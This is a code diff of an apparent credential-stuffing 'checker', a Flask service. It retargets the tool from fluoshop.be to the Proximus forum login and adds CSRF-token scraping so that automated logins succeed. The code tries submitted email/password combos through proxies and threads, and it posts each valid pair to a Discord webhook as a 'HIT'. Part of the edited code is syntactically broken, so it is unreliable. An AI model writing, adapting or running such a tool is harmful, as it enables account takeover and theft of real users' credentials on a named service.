@@ -13,12 +13,12 @@ import os
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
 
-# Configuration for: fluoshop.be
+# Configuration for: proximus.be
 SITE_CONFIG = {
-    "name": "fluoshop.be",
-    "base_url": "https://fluoshop.be",
-    "login_endpoint": "/index.php?route=account/login",
-    "csrf_token_name": "",
+    "name": "proximus.be",
+    "base_url": "https://nl.forum.proximus.be",
+    "login_endpoint": "/member/login",
+    "csrf_token_name": "login[_token]",
     "framework": "laravel"
 }
 
@@ -40,7 +40,7 @@ class CheckerEngine:
 
     async def send_discord(self, email, password):
         if not self.webhook_url: return
-        payload = {"embeds": [{"title": "HIT - fluoshop.be", "color": 3066993, "fields": [{"name": "Email", "value": f"`{email}`", "inline": True}, {"name": "Pass", "value": f"`{password}`", "inline": True}]}]}
+        payload = {"embeds": [{"title": "HIT - proximus.be", "color": 3066993, "fields": [{"name": "Email", "value": f"`{email}`", "inline": True}, {"name": "Pass", "value": f"`{password}`", "inline": True}]}]}
         try:
             async with aiohttp.ClientSession() as s:
                 await s.post(self.webhook_url, json=payload, timeout=10)
@@ -50,11 +50,18 @@ class CheckerEngine:
         timeout = self.timeout
         try:
 
-    csrf = ""  # No CSRF needed
+    # Get CSRF from login page
+    async with session.get("https://nl.forum.proximus.be/member/login", proxy=proxy, timeout=timeout) as r:
+        html = await r.text()
+        import re
+        match = re.search(r'name=["\']login[_token]["\']\s+value=["\']+([^"\']+)', html, re.I)
+        if not match:
+            match = re.search(r'value=["\']+([^"\']+)["\']+.*?name=["\']login[_token]', html, re.I)
+        csrf = match.group(1) if match else ""
 
-            data = {"email": email, "password": pwd}
+            data = {"email": email, "password": pwd}, "login[_token]": csrf}
             
-            async with session.post("https://fluoshop.be/index.php?route=account/login", data=data, proxy=proxy, timeout=timeout, allow_redirects=True) as r:
+            async with session.post("https://nl.forum.proximus.be/member/login", data=data, proxy=proxy, timeout=timeout, allow_redirects=True) as r:
                 try:
                     rj = await r.json()
                     url = rj.get("url", str(r.url))
@@ -129,7 +136,7 @@ def run_thread(job_id, combos, threads, proxies, ptype, webhook):
         loop.close()
 
 @app.route('/')
-def home(): return jsonify({"status": "online", "site": "fluoshop.be", "active": len(active_jobs)})
+def home(): return jsonify({"status": "online", "site": "proximus.be", "active": len(active_jobs)})
 
 @app.route('/health')
 def health(): return jsonify({"status": "ok"})
@@ -139,7 +146,7 @@ def config(): return jsonify(SITE_CONFIG)
 
 @app.route('/check', methods=['POST', 'GET'])
 def check():
-    if request.method == 'GET': return jsonify({"info": "POST combos to check", "site": "fluoshop.be"})
+    if request.method == 'GET': return jsonify({"info": "POST combos to check", "site": "proximus.be"})
     data = request.json
     if not data or 'combos' not in data: return jsonify({"error": "No combos provided"}), 400
     
